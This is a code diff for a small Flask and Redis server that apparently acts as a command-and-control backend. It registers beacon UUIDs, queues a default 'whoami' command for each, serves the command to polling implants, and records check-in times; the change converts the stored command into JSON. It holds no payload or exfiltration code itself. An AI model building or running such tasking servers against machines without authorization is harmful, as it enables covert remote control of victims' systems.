@@ -7,13 +7,12 @@
 # the flask webserver sees the UUID then performs a fetch from the db
 # e z p z
 
-import datetime
+from datetime import datetime
 from flask import *
-import re
+import json
 import redis  # Make sure to install and start the redis server
 # sudo systemctl start redis-server.service
 import string
-
 
 conn = redis.StrictRedis(host='localhost', port=6379, db=0)
 print('test')
@@ -30,10 +29,17 @@ def home():
         # If we receive special characters just drop it entirely
         pass
     else:
-        # Set a default command
-        Command = "whoami"
+        # I want to add a way to add the date here...
+        # As well as last check in date
+        # Lets convert the command struct to a JSON object
+        structure = {
+            "Command": "whoami",
+            "LastInteraction": "0",
+            "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}"
+        }
+        structure = json.dumps(structure)  # Dump the json
         # Write the message value to the beacon:UUID key
-        conn.hset('UUID', uuid, Command)
+        conn.hset('UUID', uuid, structure)
         return ('')
 
 
@@ -47,10 +53,23 @@ def session():
             # If we receive special characters just drop it entirely
             pass
         else:
-            command = conn.hget('UUID', uuid)
+            command = conn.hget('UUID', uuid)  # Get the struct
+            command = command.decode()  # Decode it from bytes
+            command = json.loads(command)  # it's returned as string so convert it to dict
+            structure = json.dumps(command)  # Dump the dict to json
+            comm = json.loads(structure)  # Load it into a new var
+            Command = comm["Command"]  # Grab the command var from the object
+            LastInteraction = comm["LastInteraction"]
             # Set the command to 0
-            conn.hset('UUID', uuid, '0')
-            return command
+            structure = {
+                "Command": "0",
+                "LastInteraction": f"{LastInteraction}",
+                "LastCheckIn": f"{str(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))}"
+            }
+            structure = json.dumps(structure)  # Dump the json
+            # Write the message value to the beacon:UUID key
+            conn.hset('UUID', uuid, structure)
+            return Command
 
 
 @app.route("/schema", methods=['POST'])
@@ -70,7 +89,7 @@ def schema():
 
 
 def serve():
-    app.run()#ssl_context='adhoc')
+    app.run()  # ssl_context='adhoc')
 
 
 if __name__ == "__main__":
